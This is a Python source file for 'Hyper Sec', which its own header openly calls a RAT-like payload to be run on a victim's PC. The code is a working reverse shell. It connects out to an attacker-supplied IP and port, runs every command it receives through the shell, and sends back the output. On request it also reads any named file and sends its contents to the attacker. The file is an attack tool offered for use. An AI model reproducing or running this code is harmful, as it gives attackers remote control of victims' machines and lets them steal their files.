'''
 _   _                         ____
| | | |_   _ _ __   ___ _ __  / ___|  ___  ___
| |_| | | | | '_ \ / _ \ '__| \___ \ / _ \/ __|
|  _  | |_| | |_) |  __/ |     ___) |  __/ (__ _    ---- Client.py
|_| |_|\__, | .__/ \___|_|    |____/ \___|\___(_)
       |___/|_|

Creator - Udit Singh Dhakrey
Email - hunterprogaming590@gmail.com
Github - https://github.com/hackerX-OP

Tool name - Hyper Sec.
Tool description - Hyper sec is a basic RAT like payload operator build using python , it contain 2 files, 
1> Server.py
2> Client.py

    In that, client.py file must be execute in victims PC and the file send a request to server or attacker pc on which server.py must be executed.

Name of module used in this tools:
    1> Time: For printing time
    2> pyfiglet - For printing Heading
    3> Colorama - To color the text
    4> socket - The basic work of socket connection of networking.
    5> Subprocess - to execute command and gettig result of command.

        Thank You to using It...
    Also available on YouTube - Cyber Clauses 
'''

import os
import subprocess
import socket
import argparse
import pyfiglet
import colorama

argparse = argparse.ArgumentParser()
argparse.add_argument('-i' , '--ip')
argparse.add_argument('-p' , '--port')

args= argparse.parse_args()
ip= args.ip
port = args.port


colorama.init()

blue = colorama.Fore.BLUE
grenen = colorama.Fore.GREEN
reset = colorama.Fore.RESET

bold = colorama.Style.BRIGHT

s= socket.socket(socket.AF_INET , socket.SOCK_STREAM)

def heading():
    head = pyfiglet.figlet_format("Hyper Sec.")
    print(bold , grenen)
    print(head , reset)

def connect():
    while True:
        try:
            print(f'{grenen}{bold}Listening of {ip}:{port}{colorama.Style.RESET_ALL}{reset}')
            s.connect((ip ,int(port)))
            print(f"{blue}Connected succesfully")
            break
        except:
            print(f"An error occured.{reset}")
            continue

def main():
    while True:
        response = s.recv(20480000).decode()
        if response.startswith('exit'):
            print(f"Exiting...")
            break
        elif response.startswith('download'):
            file = response.split("-")
            file.reverse()
            resp = file.pop(0)

            f = open(resp , 'rb')
            a = f.read()
            f.close()
            print(type(resp))
            s.send(a)
        
        if response.startswith('cd'):
            directory = response[3:]
            os.chdir(directory)
            s.send(f"Directory changed to {directory}".encode())

        elif response.startswith('mkdir'):
            lst = response[6:]
            # while not os.path.exists:
            try:
                os.mkdir(lst)
                s.send(f"{lst} directory succesfully created".encode())
            except:
                pass
        
        elif response.startswith('rmdir'):
            lst = response[6:]
            # while not os.path.exists:
            try:
                os.rmdir(lst)
                s.send(f"{lst} directory succesfully removed".encode())
            except:
                pass
        
        try:
            rslt = subprocess.check_output(response ,shell=True , text=True)
            # return rslt
        except Exception as e:
            rslt = str(e)
            # return rslt
        
        s.send(rslt.encode())
    

heading()
connect()
main()